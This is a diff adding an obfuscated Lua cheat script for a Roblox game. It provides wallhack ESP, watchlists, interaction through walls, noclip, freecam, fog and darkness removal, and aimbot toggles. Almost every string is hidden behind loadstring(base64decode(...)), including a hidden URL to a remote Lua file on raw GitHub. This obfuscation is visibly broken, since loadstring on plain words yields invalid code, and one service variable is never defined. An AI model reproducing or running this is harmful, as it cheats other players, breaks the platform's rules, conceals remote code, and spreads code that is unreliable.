+local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
+local UserInputService = game:GetService(loadstring(base64decode("VXNlcklucHV0U2VydmljZQ=="))())
+local Workspace = game:GetService(loadstring(base64decode("V29ya3NwYWNl"))())
+local Lighting = game:GetService(loadstring(base64decode("TGlnaHRpbmc="))())
+local ContextActionService = game:GetService(loadstring(base64decode("Q29udGV4dEFjdGlvblNlcnZpY2U="))())
+local ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
+local LocalPlayer = Players.LocalPlayer
+
+local env = type(getgenv) == loadstring(base64decode("ZnVuY3Rpb24="))() and getgenv() or _G
+if env.__TownEspCleanup then pcall(env.__TownEspCleanup) end
+
+local MENU_KEY = Enum.KeyCode.RightShift
+local DEX_URL = loadstring(base64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhbmR3aWNobW0vaWdub3JlL3JlZnMvaGVhZHMvbWFpbi9rN1FtMnhSOXZUNHBMOHdaM25CNi5sdWE="))()
+local COLOR = Color3.new(1, 1, 1)
+
+local options = {
+    esp = true, box = true, skeleton = true, names = true, tracers = false, health = true, day = false, nodark = false, nofog = false, killlog = true, loadoutspawn = false,
+    wallclick = false, noclip = false, watchlist = true, viscolor = true, safe = true, freecam = false, fly = false,
+    aimbot = false, aimtoggle = false, aimgun = false, aimwall = true, aimteam = false, aimsafe = true,
+    aimcircle = true, aimoffset = false, wallbang = false, spy = false, aimtracer = false,
+}
+local DAY_CLOCK = 14
+local savedClock
+local entries = {}
+local connections = {}
+
+local BONES_R15 = {
+    { loadstring(base64decode("SGVhZA=="))(), loadstring(base64decode("VXBwZXJUb3Jzbw=="))() }, { loadstring(base64decode("VXBwZXJUb3Jzbw=="))(), loadstring(base64decode("TG93ZXJUb3Jzbw=="))() },
+    { loadstring(base64decode("VXBwZXJUb3Jzbw=="))(), loadstring(base64decode("TGVmdFVwcGVyQXJt"))() }, { loadstring(base64decode("TGVmdFVwcGVyQXJt"))(), loadstring(base64decode("TGVmdExvd2VyQXJt"))() }, { loadstring(base64decode("TGVmdExvd2VyQXJt"))(), loadstring(base64decode("TGVmdEhhbmQ="))() },
+    { loadstring(base64decode("VXBwZXJUb3Jzbw=="))(), loadstring(base64decode("UmlnaHRVcHBlckFybQ=="))() }, { loadstring(base64decode("UmlnaHRVcHBlckFybQ=="))(), loadstring(base64decode("UmlnaHRMb3dlckFybQ=="))() }, { loadstring(base64decode("UmlnaHRMb3dlckFybQ=="))(), loadstring(base64decode("UmlnaHRIYW5k"))() },
+    { loadstring(base64decode("TG93ZXJUb3Jzbw=="))(), loadstring(base64decode("TGVmdFVwcGVyTGVn"))() }, { loadstring(base64decode("TGVmdFVwcGVyTGVn"))(), loadstring(base64decode("TGVmdExvd2VyTGVn"))() }, { loadstring(base64decode("TGVmdExvd2VyTGVn"))(), loadstring(base64decode("TGVmdEZvb3Q="))() },
+    { loadstring(base64decode("TG93ZXJUb3Jzbw=="))(), loadstring(base64decode("UmlnaHRVcHBlckxlZw=="))() }, { loadstring(base64decode("UmlnaHRVcHBlckxlZw=="))(), loadstring(base64decode("UmlnaHRMb3dlckxlZw=="))() }, { loadstring(base64decode("UmlnaHRMb3dlckxlZw=="))(), loadstring(base64decode("UmlnaHRGb290"))() },
+}
+local BONES_R6 = {
+    { loadstring(base64decode("SGVhZA=="))(), loadstring(base64decode("VG9yc28="))() }, { loadstring(base64decode("VG9yc28="))(), loadstring(base64decode("TGVmdCBBcm0="))() }, { loadstring(base64decode("VG9yc28="))(), loadstring(base64decode("UmlnaHQgQXJt"))() },
+    { loadstring(base64decode("VG9yc28="))(), loadstring(base64decode("TGVmdCBMZWc="))() }, { loadstring(base64decode("VG9yc28="))(), loadstring(base64decode("UmlnaHQgTGVn"))() },
+}
+local MAX_BONES = #BONES_R15
+
+local WATCH_COLOR = Color3.fromRGB(255, 40, 40)
+local SAFE_COLOR = Color3.fromRGB(90, 255, 120)
+local UNSAFE_COLOR = Color3.fromRGB(255, 130, 40)
+local HIDDEN_DIM = 0.45
+local DEAD_HEALTH = 1
+local HEALTH_FULL = Color3.fromRGB(70, 255, 100)
+local HEALTH_EMPTY = Color3.fromRGB(255, 50, 50)
+local WATCH_FILE = loadstring(base64decode("VG93bkVzcFdhdGNobGlzdC50eHQ="))()
+local watchlist = {}
+
+local function saveWatchlist()
+    if type(writefile) ~= loadstring(base64decode("ZnVuY3Rpb24="))() then return end
+    local names = {}
+    for name in pairs(watchlist) do table.insert(names, name) end
+    pcall(writefile, WATCH_FILE, table.concat(names, loadstring(base64decode("XG4="))()))
+end
+
+local function loadWatchlist()
+    if type(isfile) ~= loadstring(base64decode("ZnVuY3Rpb24="))() or type(readfile) ~= loadstring(base64decode("ZnVuY3Rpb24="))() then return end
+    local ok, text = pcall(function()
+        return isfile(WATCH_FILE) and readfile(WATCH_FILE) or loadstring(base64decode(""))()
+    end)
+    if not ok then return end
+    for line in string.gmatch(text, loadstring(base64decode("W15cclxuXSs="))()) do watchlist[line:lower()] = true end
+end
+loadWatchlist()
+
+local function addWatch(text)
+    local q = (text or loadstring(base64decode(""))()):match(loadstring(base64decode("XiVzKiguLSklcyok"))()):lower()
+    if q == loadstring(base64decode(""))() then return end
+
+    local matches = {}
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr.Name:lower():sub(1, #q) == q or plr.DisplayName:lower():sub(1, #q) == q then
+            table.insert(matches, plr)
+        end
+    end
+    if #matches == 1 then q = matches[1].Name:lower() end
+    watchlist[q] = true
+    saveWatchlist()
+end
+
+local function isWatched(player)
+    return options.watchlist
+        and (watchlist[player.Name:lower()] or watchlist[player.DisplayName:lower()]) == true
+end
+
+local visibilityParams = RaycastParams.new()
+visibilityParams.FilterType = Enum.RaycastFilterType.Exclude
+visibilityParams.RespectCanCollide = true
+
+local function isVisible(camera, character, root)
+    local ignore = { character }
+    local mine = LocalPlayer.Character
+    if mine then table.insert(ignore, mine) end
+    visibilityParams.FilterDescendantsInstances = ignore
+
+    local origin = camera.CFrame.Position
+    if not Workspace:Raycast(origin, root.Position - origin, visibilityParams) then return true end
+    local head = character:FindFirstChild(loadstring(base64decode("SGVhZA=="))())
+    if head and not Workspace:Raycast(origin, head.Position - origin, visibilityParams) then return true end
+    return false
+end
+
+local parentGui = (type(gethui) == loadstring(base64decode("ZnVuY3Rpb24="))() and gethui()) or LocalPlayer:WaitForChild(loadstring(base64decode("UGxheWVyR3Vp"))())
+
+local overlay = Instance.new(loadstring(base64decode("U2NyZWVuR3Vp"))())
+overlay.Name = loadstring(base64decode("VG93bkVzcE92ZXJsYXk="))()
+overlay.ResetOnSpawn = false
+overlay.IgnoreGuiInset = true
+overlay.DisplayOrder = 1
+overlay.Parent = parentGui
+
+local function newEntry()
+    local box = Instance.new(loadstring(base64decode("RnJhbWU="))())
+    box.BackgroundTransparency = 1
+    box.BorderSizePixel = 0
+    box.Visible = false
+    box.Parent = overlay
+    local stroke = Instance.new(loadstring(base64decode("VUlTdHJva2U="))())
+    stroke.Color = COLOR
+    stroke.Thickness = 1
+    stroke.Parent = box
+
+    local label = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))())
+    label.Size = UDim2.fromOffset(200, 14)
+    label.AnchorPoint = Vector2.new(0.5, 1)
+    label.BackgroundTransparency = 1
+    label.Font = Enum.Font.Code
+    label.TextSize = 14
+    label.TextColor3 = COLOR
+    label.TextStrokeTransparency = 0
+    label.Visible = false
+    label.Parent = overlay
+
+    local safeLabel = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))())
+    safeLabel.Size = UDim2.fromOffset(120, 14)
+    safeLabel.AnchorPoint = Vector2.new(0.5, 0)
+    safeLabel.BackgroundTransparency = 1
+    safeLabel.Font = Enum.Font.Code
+    safeLabel.TextSize = 14
+    safeLabel.TextColor3 = SAFE_COLOR
+    safeLabel.TextStrokeTransparency = 0
+    safeLabel.Visible = false
+    safeLabel.Parent = overlay
+
+    local healthBack = Instance.new(loadstring(base64decode("RnJhbWU="))())
+    healthBack.BackgroundColor3 = Color3.new(0, 0, 0)
+    healthBack.BackgroundTransparency = 0.3
+    healthBack.BorderSizePixel = 0
+    healthBack.Visible = false
+    healthBack.Parent = overlay
+
+    local healthFill = Instance.new(loadstring(base64decode("RnJhbWU="))())
+    healthFill.AnchorPoint = Vector2.new(0, 1)
+    healthFill.Position = UDim2.fromScale(0, 1)
+    healthFill.Size = UDim2.fromScale(1, 1)
+    healthFill.BackgroundColor3 = HEALTH_FULL
+    healthFill.BorderSizePixel = 0
+    healthFill.Parent = healthBack
+
+    local healthText = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))())
+    healthText.Size = UDim2.fromOffset(30, 12)
+    healthText.AnchorPoint = Vector2.new(1, 0.5)
+    healthText.BackgroundTransparency = 1
+    healthText.Font = Enum.Font.Code
+    healthText.TextSize = 12
+    healthText.TextColor3 = COLOR
+    healthText.TextStrokeTransparency = 0
+    healthText.TextXAlignment = Enum.TextXAlignment.Right
+    healthText.Visible = false
+    healthText.Parent = overlay
+
+    local lines = {}
+    for JfZaEVmK = 1, MAX_BONES do
+        local line = Instance.new(loadstring(base64decode("RnJhbWU="))())
+        line.AnchorPoint = Vector2.new(0.5, 0.5)
+        line.BackgroundColor3 = COLOR
+        line.BorderSizePixel = 0
+        line.Visible = false
+        line.Parent = overlay
+        lines[JfZaEVmK] = line
+    end
+
+    local tracer = Instance.new(loadstring(base64decode("RnJhbWU="))())
+    tracer.AnchorPoint = Vector2.new(0.5, 0.5)
+    tracer.BackgroundColor3 = COLOR
+    tracer.BorderSizePixel = 0
+    tracer.Visible = false
+    tracer.Parent = overlay
+
+    return {
+        box = box, stroke = stroke, label = label, safeLabel = safeLabel, lines = lines, tracer = tracer,
+        healthBack = healthBack, healthFill = healthFill, healthText = healthText,
+        shown = false, color = COLOR,
+    }
+end
+
+local function destroyEntry(entry)
+    entry.box:Destroy()
+    entry.label:Destroy()
+    entry.safeLabel:Destroy()
+    entry.tracer:Destroy()
+    entry.healthBack:Destroy()
+    entry.healthText:Destroy()
+    for _, line in ipairs(entry.lines) do line:Destroy() end
+end
+
+local function hideEntry(entry)
+    if not entry.shown then return end
+    entry.shown = false
+    entry.box.Visible = false
+    entry.label.Visible = false
+    entry.safeLabel.Visible = false
+    entry.tracer.Visible = false
+    entry.healthBack.Visible = false
+    entry.healthText.Visible = false
+    for _, line in ipairs(entry.lines) do line.Visible = false end
+end
+
+local function applyColor(entry, color)
+    entry.color = color
+    entry.stroke.Color = color
+    entry.label.TextColor3 = color
+    entry.tracer.BackgroundColor3 = color
+    for _, line in ipairs(entry.lines) do line.BackgroundColor3 = color end
+end
+
+local function setLine(line, a, b)
+    local delta = b - a
+    line.Size = UDim2.fromOffset(delta.Magnitude, 1)
+    line.Position = UDim2.fromOffset((a.X + b.X) / 2, (a.Y + b.Y) / 2)
+    line.Rotation = math.deg(math.atan2(delta.Y, delta.X))
+    line.Visible = true
+end
+
+local function render()
+    local camera = Workspace.CurrentCamera
+    if not camera then return end
+
+    for player, entry in pairs(entries) do
+        local character = player.Character
+        local root = character and character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
+        local humanoid = character and character:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
+
+        local rootPos, onScreen
+        if options.esp and root and humanoid and humanoid.Health > DEAD_HEALTH then
+            rootPos, onScreen = camera:WorldToViewportPoint(root.Position)
+        end
+
+        if not onScreen then
+            hideEntry(entry)
+        else
+            entry.shown = true
+
+            local base = isWatched(player) and WATCH_COLOR or COLOR
+            local visible = not options.viscolor or isVisible(camera, character, root)
+            local color = visible and base or base:Lerp(Color3.new(0, 0, 0), HIDDEN_DIM)
+            if entry.color ~= color then applyColor(entry, color) end
+
+            local ok, cf, size = pcall(character.GetBoundingBox, character)
+            local center = ok and cf.Position or root.Position
+            local halfHeight = ok and size.Y / 2 or 3
+            local top = camera:WorldToViewportPoint(center + Vector3.new(0, halfHeight, 0))
+            local bottom = camera:WorldToViewportPoint(center - Vector3.new(0, halfHeight, 0))
+            local height = math.abs(bottom.Y - top.Y)
+            local width = height * 0.55
+
+            entry.box.Visible = options.box and top.Z > 0 and bottom.Z > 0
+            if entry.box.Visible then
+                entry.box.Position = UDim2.fromOffset(rootPos.X - width / 2, top.Y)
+                entry.box.Size = UDim2.fromOffset(width, height)
+            end
+
+            local showHealth = options.health and top.Z > 0 and bottom.Z > 0
+            entry.healthBack.Visible = showHealth
+            entry.healthText.Visible = showHealth
+            if showHealth then
+                local maxHealth = math.max(humanoid.MaxHealth, 1)
+                local fraction = math.clamp(humanoid.Health / maxHealth, 0, 1)
+                local barX = rootPos.X - width / 2 - 6
+                entry.healthBack.Position = UDim2.fromOffset(barX, top.Y)
+                entry.healthBack.Size = UDim2.fromOffset(3, height)
+                entry.healthFill.Size = UDim2.fromScale(1, fraction)
+                entry.healthFill.BackgroundColor3 = HEALTH_EMPTY:Lerp(HEALTH_FULL, fraction)
+                entry.healthText.Text = tostring(math.ceil(humanoid.Health))
+                entry.healthText.Position = UDim2.fromOffset(barX - 2, top.Y + height * (1 - fraction))
+            end
+
+            if options.tracers and bottom.Z > 0 then
+                local viewport = camera.ViewportSize
+                setLine(entry.tracer,
+                    Vector2.new(viewport.X / 2, viewport.Y),
+                    Vector2.new(rootPos.X, bottom.Y))
+            else
+                entry.tracer.Visible = false
+            end
+
+            entry.safeLabel.Visible = options.safe and bottom.Z > 0
+            if entry.safeLabel.Visible then
+                local safe = character:FindFirstChildOfClass(loadstring(base64decode("Rm9yY2VGaWVsZA=="))()) ~= nil
+                local tagColor = safe and SAFE_COLOR or UNSAFE_COLOR
+                entry.safeLabel.Text = safe and loadstring(base64decode("U0FGRQ=="))() or loadstring(base64decode("VU5TQUZF"))()
+                entry.safeLabel.TextColor3 = visible and tagColor or tagColor:Lerp(Color3.new(0, 0, 0), HIDDEN_DIM)
+                entry.safeLabel.Position = UDim2.fromOffset(rootPos.X, bottom.Y + 2)
+            end
+
+            entry.label.Visible = options.names
+            if options.names then
+                local distance = math.floor((camera.CFrame.Position - root.Position).Magnitude)
+                entry.label.Text = player.Name .. loadstring(base64decode("IFs="))() .. distance .. loadstring(base64decode("XQ=="))()
+                entry.label.Position = UDim2.fromOffset(rootPos.X, top.Y - 2)
+            end
+
+            local bones = character:FindFirstChild(loadstring(base64decode("VXBwZXJUb3Jzbw=="))()) and BONES_R15 or BONES_R6
+            for JfZaEVmK = 1, MAX_BONES do
+                local line = entry.lines[JfZaEVmK]
+                local bone = options.skeleton and bones[JfZaEVmK]
+                local partA = bone and character:FindFirstChild(bone[1])
+                local partB = bone and character:FindFirstChild(bone[2])
+                if partA and partB then
+                    local a = camera:WorldToViewportPoint(partA.Position)
+                    local b = camera:WorldToViewportPoint(partB.Position)
+                    if a.Z > 0 and b.Z > 0 then
+                        setLine(line, Vector2.new(a.X, a.Y), Vector2.new(b.X, b.Y))
+                    else
+                        line.Visible = false
+                    end
+                else
+                    line.Visible = false
+                end
+            end
+        end
+    end
+end
+
+local function hook(player)
+    if player == LocalPlayer or entries[player] then return end
+    entries[player] = newEntry()
+end
+
+local function unhook(player)
+    local entry = entries[player]
+    if not entry then return end
+    entries[player] = nil
+    destroyEntry(entry)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do hook(player) end
+table.insert(connections, Players.PlayerAdded:Connect(hook))
+table.insert(connections, Players.PlayerRemoving:Connect(unhook))
+table.insert(connections, RunService.RenderStepped:Connect(render))
+
+table.insert(connections, RunService.Heartbeat:Connect(function()
+    if options.day and Lighting.ClockTime ~= DAY_CLOCK then
+        Lighting.ClockTime = DAY_CLOCK
+    end
+end))
+
+local NODARK_LEVELS = {
+    { name = loadstring(base64decode("TG93"))(),  ambient = 90,  exposure = 0 },
+    { name = loadstring(base64decode("TWVk"))(),  ambient = 140, exposure = 0.25 },
+    { name = loadstring(base64decode("SGlnaA=="))(), ambient = 190, exposure = 0.5 },
+}
+local noDarkLevel = 2
+local noDarkSaved
+
+local function raiseColor(current, floor)
+    return Color3.new(math.max(current.R, floor.R), math.max(current.G, floor.G), math.max(current.B, floor.B))
+end
+
+local function applyNoDark()
+    if not options.nodark then return end
+    local level = NODARK_LEVELS[noDarkLevel]
+    local floor = Color3.fromRGB(level.ambient, level.ambient, level.ambient)
+
+    local ambient = raiseColor(Lighting.Ambient, floor)
+    if ambient ~= Lighting.Ambient then Lighting.Ambient = ambient end
+
+    local outdoor = raiseColor(Lighting.OutdoorAmbient, floor)
+    if outdoor ~= Lighting.OutdoorAmbient then Lighting.OutdoorAmbient = outdoor end
+
+    if Lighting.ExposureCompensation < level.exposure then
+        Lighting.ExposureCompensation = level.exposure
+    end
+end
+
+local function restoreNoDark()
+    if not noDarkSaved then return end
+    Lighting.Ambient = noDarkSaved.ambient
+    Lighting.OutdoorAmbient = noDarkSaved.outdoor
+    Lighting.ExposureCompensation = noDarkSaved.exposure
+    noDarkSaved = nil
+end
+
+table.insert(connections, RunService.RenderStepped:Connect(applyNoDark))
+table.insert(connections, RunService.Heartbeat:Connect(applyNoDark))
+for _, prop in ipairs({ loadstring(base64decode("QW1iaWVudA=="))(), loadstring(base64decode("T3V0ZG9vckFtYmllbnQ="))(), loadstring(base64decode("RXhwb3N1cmVDb21wZW5zYXRpb24="))() }) do
+
+    table.insert(connections, Lighting:GetPropertyChangedSignal(prop):Connect(applyNoDark))
+end
+
+pcall(function()
+    RunService:BindToRenderStep(loadstring(base64decode("VG93bkVzcE5vRGFyaw=="))(), Enum.RenderPriority.Last.Value + 1, applyNoDark)
+end)
+
+local NOFOG_DISTANCE = 1e6
+local noFogSaved
+local atmospheres = {}
+local atmosphereSaved = {}
+
+local function saveAtmosphere(atmosphere)
+    if not atmosphereSaved[atmosphere] then
+        atmosphereSaved[atmosphere] = { density = atmosphere.Density, haze = atmosphere.Haze }
+    end
+end
+
+local function applyNoFog()
+    if not options.nofog then return end
+    if Lighting.FogEnd ~= NOFOG_DISTANCE then Lighting.FogEnd = NOFOG_DISTANCE end
+    if Lighting.FogStart ~= NOFOG_DISTANCE then Lighting.FogStart = NOFOG_DISTANCE end
+    for atmosphere in pairs(atmospheres) do
+        if atmosphere.Parent then
+            saveAtmosphere(atmosphere)
+            if atmosphere.Density ~= 0 then atmosphere.Density = 0 end
+            if atmosphere.Haze ~= 0 then atmosphere.Haze = 0 end
+        else
+            atmospheres[atmosphere] = nil
+        end
+    end
+end
+
+local function restoreNoFog()
+    if noFogSaved then
+        Lighting.FogStart = noFogSaved.fogStart
+        Lighting.FogEnd = noFogSaved.fogEnd
+        noFogSaved = nil
+    end
+    for atmosphere, original in pairs(atmosphereSaved) do
+        if atmosphere.Parent then
+            atmosphere.Density = original.density
+            atmosphere.Haze = original.haze
+        end
+    end
+    atmosphereSaved = {}
+end
+
+local function trackAtmosphere(atmosphere)
+    if atmospheres[atmosphere] then return end
+    atmospheres[atmosphere] = true
+
+    table.insert(connections, atmosphere:GetPropertyChangedSignal(loadstring(base64decode("RGVuc2l0eQ=="))()):Connect(applyNoFog))
+    table.insert(connections, atmosphere:GetPropertyChangedSignal(loadstring(base64decode("SGF6ZQ=="))()):Connect(applyNoFog))
+    applyNoFog()
+end
+
+for _, descendant in ipairs(Lighting:GetDescendants()) do
+    if descendant:IsA(loadstring(base64decode("QXRtb3NwaGVyZQ=="))()) then trackAtmosphere(descendant) end
+end
+table.insert(connections, Lighting.DescendantAdded:Connect(function(descendant)
+    if descendant:IsA(loadstring(base64decode("QXRtb3NwaGVyZQ=="))()) then trackAtmosphere(descendant) end
+end))
+
+table.insert(connections, RunService.RenderStepped:Connect(applyNoFog))
+table.insert(connections, RunService.Heartbeat:Connect(applyNoFog))
+table.insert(connections, Lighting:GetPropertyChangedSignal(loadstring(base64decode("Rm9nRW5k"))()):Connect(applyNoFog))
+table.insert(connections, Lighting:GetPropertyChangedSignal(loadstring(base64decode("Rm9nU3RhcnQ="))()):Connect(applyNoFog))
+
+pcall(function()
+    RunService:BindToRenderStep(loadstring(base64decode("VG93bkVzcE5vRm9n"))(), Enum.RenderPriority.Last.Value + 1, applyNoFog)
+end)
+
+local WALL_RANGE = 60
+local GAME_REACH = 32
+local wallTargets = {}
+local wallList = {}
+local wallParams = RaycastParams.new()
+wallParams.FilterType = Enum.RaycastFilterType.Include
+local wallDirty = true
+local lastWallClick = 0
+
+local wallHighlight = Instance.new(loadstring(base64decode("SGlnaGxpZ2h0"))())
+wallHighlight.FillColor = COLOR
+wallHighlight.FillTransparency = 0.7
+wallHighlight.OutlineColor = COLOR
+wallHighlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+wallHighlight.Parent = (type(gethui) == loadstring(base64decode("ZnVuY3Rpb24="))() and gethui()) or Workspace
+
+task.spawn(function()
+    local count = 0
+    for _, d in ipairs(Workspace:GetDescendants()) do
+        if d:IsA(loadstring(base64decode("Q2xpY2tEZXRlY3Rvcg=="))()) then wallTargets[d] = true end
+        count += 1
+        if count % 4000 == 0 then task.wait() end
+    end
+    wallDirty = true
+end)
+table.insert(connections, Workspace.DescendantAdded:Connect(function(d)
+    if d:IsA(loadstring(base64decode("Q2xpY2tEZXRlY3Rvcg=="))()) then wallTargets[d] = true; wallDirty = true end
+end))
+table.insert(connections, Workspace.DescendantRemoving:Connect(function(d)
+    if wallTargets[d] then wallTargets[d] = nil; wallDirty = true end
+end))
+
+local function rebuildWall()
+    wallDirty = false
+    wallList = {}
+    local seen = {}
+    for cd in pairs(wallTargets) do
+        local parent = cd.Parent
+        if parent and parent:IsDescendantOf(Workspace) then
+            if not seen[parent] then
+                seen[parent] = true
+                table.insert(wallList, parent)
+            end
+        else
+            wallTargets[cd] = nil
+        end
+    end
+    wallParams.FilterDescendantsInstances = wallList
+end
+
+local function mouseRay(camera)
+    local mouse = UserInputService:GetMouseLocation()
+    return camera:ViewportPointToRay(mouse.X, mouse.Y)
+end
+
+local function findWallTarget()
+    local camera = Workspace.CurrentCamera
+    if not camera then return end
+    if wallDirty then rebuildWall() end
+    if #wallList == 0 then return end
+
+    local ray = mouseRay(camera)
+    local hit = Workspace:Raycast(ray.Origin, ray.Direction * WALL_RANGE, wallParams)
+    if not hit then return end
+
+    local node = hit.Instance
+    while node and node ~= Workspace do
+        local cd = node:FindFirstChildOfClass(loadstring(base64decode("Q2xpY2tEZXRlY3Rvcg=="))())
+        if cd then return cd, hit end
+        node = node.Parent
+    end
+end
+
+local function gameCanReach(cd, hit)
+    local camera = Workspace.CurrentCamera
+    local character = LocalPlayer.Character
+    local params = RaycastParams.new()
+    params.FilterType = Enum.RaycastFilterType.Exclude
+    params.FilterDescendantsInstances = character and { character } or {}
+
+    local ray = mouseRay(camera)
+    local first = Workspace:Raycast(ray.Origin, ray.Direction * WALL_RANGE, params)
+    if not first or not (first.Instance == cd.Parent or first.Instance:IsDescendantOf(cd.Parent)) then
+        return false
+    end
+
+    local root = character and character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
+    local reach = cd.MaxActivationDistance
+    if reach <= 0 then reach = GAME_REACH end
+    return root ~= nil and (root.Position - hit.Position).Magnitude <= reach
+end
+
+table.insert(connections, RunService.RenderStepped:Connect(function()
+    if not options.wallclick then
+        wallHighlight.Adornee = nil
+        return
+    end
+    local cd = findWallTarget()
+    local target = cd and cd.Parent
+    wallHighlight.Adornee = (target and target:IsA(loadstring(base64decode("UFZJbnN0YW5jZQ=="))())) and target or nil
+end))
+
+table.insert(connections, UserInputService.InputBegan:Connect(function(input, processed)
+    if processed or not options.wallclick then return end
+    if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
+    if os.clock() - lastWallClick < 0.2 then return end
+
+    local cd, hit = findWallTarget()
+    if not cd or gameCanReach(cd, hit) then return end
+
+    lastWallClick = os.clock()
+    pcall(fireclickdetector, cd)
+end))
+
+local noclipped = {}
+local lastNoclipClick = 0
+
+local function resetNoclip()
+    for part, original in pairs(noclipped) do
+        if part.Parent then
+            part.CanCollide = original.canCollide
+            part.Transparency = original.transparency
+        end
+    end
+    noclipped = {}
+end
+
+local function pickWall(camera)
+    local ignore = {}
+    local character = LocalPlayer.Character
+    if character then table.insert(ignore, character) end
+
+    local params = RaycastParams.new()
+    params.FilterType = Enum.RaycastFilterType.Exclude
+    local mouse = UserInputService:GetMouseLocation()
+    local ray = camera:ViewportPointToRay(mouse.X, mouse.Y)
+
+    for _ = 1, 12 do
+        params.FilterDescendantsInstances = ignore
+        local hit = Workspace:Raycast(ray.Origin, ray.Direction * 500, params)
+        if not hit then return nil end
+        local part = hit.Instance
+        if part:IsA(loadstring(base64decode("VGVycmFpbg=="))()) or not part:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then return nil end
+
+        local model = part:FindFirstAncestorOfClass(loadstring(base64decode("TW9kZWw="))())
+        local isPlayer = model and Players:GetPlayerFromCharacter(model)
+        if isPlayer or (not part.CanCollide and not noclipped[part]) then
+            table.insert(ignore, part)
+        else
+            return part
+        end
+    end
+end
+
+table.insert(connections, UserInputService.InputBegan:Connect(function(input, processed)
+    if processed or not options.noclip then return end
+    if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
+    if os.clock() - lastNoclipClick < 0.15 then return end
+
+    local camera = Workspace.CurrentCamera
+    if not camera then return end
+    local part = pickWall(camera)
+    if not part then return end
+    lastNoclipClick = os.clock()
+
+    local saved = noclipped[part]
+    if saved then
+        part.CanCollide = saved.canCollide
+        part.Transparency = saved.transparency
+        noclipped[part] = nil
+    else
+        noclipped[part] = { canCollide = part.CanCollide, transparency = part.Transparency }
+        part.CanCollide = false
+        part.Transparency = 0.5
+    end
+end))
+
+local FREECAM_KEY = Enum.KeyCode.P
+local FC_ACTION = loadstring(base64decode("VG93bkVzcEZyZWVjYW1TaW5r"))()
+local FC_SENSITIVITY = 0.004
+local fc = { position = Vector3.new(), pitch = 0, yaw = 0, speed = 32, looking = false, saved = nil, conns = {} }
+local refreshFreecam
+
+local function applyFreecam()
+    if not options.freecam then return end
+    local camera = Workspace.CurrentCamera
+    if not camera then return end
+    if camera.CameraType ~= Enum.CameraType.Scriptable then camera.CameraType = Enum.CameraType.Scriptable end
+    local cf = CFrame.new(fc.position) * CFrame.fromOrientation(fc.pitch, fc.yaw, 0)
+    if camera.CFrame ~= cf then camera.CFrame = cf end
+end
+
+local function stepFreecam(dt)
+    if not options.freecam then return end
+    if not UserInputService:GetFocusedTextBox() then
+        local function down(key) return UserInputService:IsKeyDown(key) and 1 or 0 end
+        local x = down(Enum.KeyCode.D) - down(Enum.KeyCode.A)
+        local eD4aGZhp = down(Enum.KeyCode.S) - down(Enum.KeyCode.W)
+        local NNH7AO0X = math.max(down(Enum.KeyCode.E), down(Enum.KeyCode.Space))
+            - math.max(down(Enum.KeyCode.Q), down(Enum.KeyCode.LeftControl))
+        local rot = CFrame.fromOrientation(fc.pitch, fc.yaw, 0)
+        local move = rot:VectorToWorldSpace(Vector3.new(x, 0, eD4aGZhp)) + Vector3.new(0, NNH7AO0X, 0)
+        if move.Magnitude > 0 then
+            local fast = (UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsKeyDown(Enum.KeyCode.RightShift)) and 4 or 1
+            fc.position = fc.position + move.Unit * fc.speed * fast * dt
+        end
+    end
+    applyFreecam()
+end
+
+local function setFreecam(on)
+    local camera = Workspace.CurrentCamera
+    if on then
+        if not camera then options.freecam = false return end
+        fc.saved = { cameraType = camera.CameraType, subject = camera.CameraSubject }
+        local rx, ry = camera.CFrame:ToOrientation()
+        fc.position, fc.pitch, fc.yaw = camera.CFrame.Position, rx, ry
+        camera.CameraType = Enum.CameraType.Scriptable
+
+        ContextActionService:BindActionAtPriority(FC_ACTION, function()
+            return Enum.ContextActionResult.Sink
+        end, false, Enum.ContextActionPriority.High.Value,
+            Enum.KeyCode.W, Enum.KeyCode.A, Enum.KeyCode.S, Enum.KeyCode.D,
+            Enum.KeyCode.Q, Enum.KeyCode.E, Enum.KeyCode.Space, Enum.KeyCode.LeftControl)
+
+        fc.conns = {
+            camera:GetPropertyChangedSignal(loadstring(base64decode("Q0ZyYW1l"))()):Connect(applyFreecam),
+            camera:GetPropertyChangedSignal(loadstring(base64decode("Q2FtZXJhVHlwZQ=="))()):Connect(applyFreecam),
+        }
+    else
+        for _, connection in ipairs(fc.conns) do connection:Disconnect() end
+        fc.conns = {}
+        pcall(function() ContextActionService:UnbindAction(FC_ACTION) end)
+        if fc.looking then
+            fc.looking = false
+            UserInputService.MouseBehavior = Enum.MouseBehavior.Default
+        end
+        if camera and fc.saved then
+            camera.CameraType = fc.saved.cameraType
+            if fc.saved.subject then camera.CameraSubject = fc.saved.subject end
+        end
+        fc.saved = nil
+    end
+end
+
+table.insert(connections, RunService.RenderStepped:Connect(applyFreecam))
+pcall(function()
+    RunService:BindToRenderStep(loadstring(base64decode("VG93bkVzcEZyZWVjYW0="))(), Enum.RenderPriority.Last.Value + 1, stepFreecam)
+end)
+
+table.insert(connections, UserInputService.InputBegan:Connect(function(input, processed)
+    if processed then return end
+    if input.KeyCode == FREECAM_KEY then
+        options.freecam = not options.freecam
+        setFreecam(options.freecam)
+        if refreshFreecam then refreshFreecam() end
+    elseif options.freecam and input.UserInputType == Enum.UserInputType.MouseButton2 then
+        fc.looking = true
+        UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
+    end
+end))
+table.insert(connections, UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton2 and fc.looking then
+        fc.looking = false
+        UserInputService.MouseBehavior = Enum.MouseBehavior.Default
+    end
+end))
